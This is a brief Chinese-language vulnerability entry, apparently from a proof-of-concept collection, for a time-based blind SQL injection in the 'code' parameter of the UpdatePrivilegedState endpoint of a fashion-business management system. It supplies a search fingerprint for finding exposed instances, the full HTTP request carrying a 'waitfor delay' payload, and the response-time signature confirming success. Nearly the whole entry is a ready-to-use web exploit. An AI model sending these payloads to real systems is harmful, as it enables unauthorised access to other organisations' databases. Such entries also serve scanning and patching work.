# 时尚企业管理系统UpdatePrivilegedStatecode参数存在SQL注入漏洞

时尚企业管理系统UpdatePrivilegedStatecode参数 ｜ SQL注入 ｜ —
- **指纹**：`body="4008-820-967"`
- **请求**：`GET /Interface/licx/PrivilegedCodeDestroy.asmx/UpdatePrivilegedState?code=%27+%3Bwaitfor+delay+%270%3A0%3A0%27+-- HTTP/1.1`

**Payload**
```
GET /Interface/licx/PrivilegedCodeDestroy.asmx/UpdatePrivilegedState?code=%27+%3Bwaitfor+delay+%270%3A0%3A3%27+-- HTTP/1.1
Host:
```
- **响应特征**：200 响应时间≥3s